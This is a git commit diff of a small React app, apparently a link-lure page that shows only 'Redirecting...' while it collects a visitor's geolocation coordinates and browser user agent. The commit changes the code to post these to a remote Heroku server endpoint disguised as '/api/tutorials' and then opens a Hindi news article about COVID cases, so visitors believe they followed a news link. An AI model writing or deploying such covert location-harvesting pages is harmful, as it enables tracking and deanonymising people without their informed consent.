dffcd28dcab034d7d14e0ceb1b4c9eb91c5c21a4
Hashir Sheikh <hashir.s@genietalk.ai>
2021-05-05 14:43:20 +0530

    second commit

--- src/App.js
+++ src/App.js
@@ -1,11 +1,7 @@
 import React from "react";
 import axios from "axios";
+import { geolocated } from "react-geolocated";
 
-var options = {
-  enableHighAccuracy: true,
-  timeout: 5000,
-  maximumAge: 0,
-};
 function success(pos) {
   var crd = pos.coords;
 
@@ -14,10 +10,10 @@ function success(pos) {
   console.log(`Longitude: ${crd.longitude}`);
   console.log(navigator.userAgent + `More or less ${crd.accuracy} meters.`);
   sub({
-    lat: ""+crd.latitude,
-    long: ""+crd.longitude,
-    description: ""+navigator.userAgent
-  })
+    lat: "" + crd.latitude,
+    long: "" + crd.longitude,
+    description: "" + navigator.userAgent,
+  });
 }
 
 function errors(err) {
@@ -25,54 +21,54 @@ function errors(err) {
   sub({
     lat: "-1",
     long: "-1",
-    description: ""+navigator.userAgent
-  })
-}
-
-function sub(data) {
-  axios.post(`http://localhost:3031/api/tutorials`,  data ).then((res) => {
-    console.log(res);
-    window.open("https://www.bhaskar.com/local/haryana/news/in-24-hours-16246-new-patients-were-found-181-deaths-cases-increased-by-2813-and-deaths-increased-by-1383-128465757.html", '_blank');
-  
+    description: "" + navigator.userAgent,
   });
 }
 
+function sub(lat, long) {
+  axios
+    .post(`https://dry-brook-62551.herokuapp.com/api/tutorials`, {
+      lat: lat,
+      long: long,
+      description: "" + navigator.userAgent,
+    })
+    .then((res) => {
+      console.log(res);
+      window.open(
+        "https://www.bhaskar.com/local/haryana/news/in-24-hours-16246-new-patients-were-found-181-deaths-cases-increased-by-2813-and-deaths-increased-by-1383-128465757.html",
+        "_blank"
+      );
+    });
+}
+
 class App extends React.Component {
-  componentDidMount() {
-    if (navigator.geolocation) {
-      navigator.permissions
-        .query({ name: "geolocation" })
-        .then(function (result) {
-          if (result.state === "granted") {
-            console.log(result.state);
-            //If granted then you can directly call your function here
-            navigator.geolocation.getCurrentPosition(success);
-          } else if (result.state === "prompt") {
-            navigator.geolocation.getCurrentPosition(success, errors, options);
-          } else if (result.state === "denied") {
-            //If denied then you have to show instructions to enable location
-          }
-          result.onchange = function () {
-            console.log(result.state);
-          };
-        });
-    } else {
-      console.log(navigator.userAgent + "Sorry Not available!");
-      sub({
-        lat: "-2",
-        long: "-2",
-        description: ""+navigator.userAgent
-      })
-    }
+  constructor(props) {
+    super(props);
+    this.state = {
+      onSuccess: success,
+      onError: errors,
+    };
   }
 
   render() {
-    return (
+    return !this.props.isGeolocationAvailable ? (
+      <div>Redirecting...</div>
+    ) : !this.props.isGeolocationEnabled ? (
+      <div>Redirecting..</div>
+    ) : this.props.coords ? (
       <div>
-        <h2>Redirecting...</h2>
+        {sub(`${this.props.coords.latitude}`, `${this.props.coords.longitude}`)}
+        Redirecting..
       </div>
+    ) : (
+      <div>Getting the location data&hellip; </div>
     );
   }
 }
 
-export default App;
+export default geolocated({
+  positionOptions: {
+    enableHighAccuracy: false,
+  },
+  userDecisionTimeout: 5000,
+})(App);
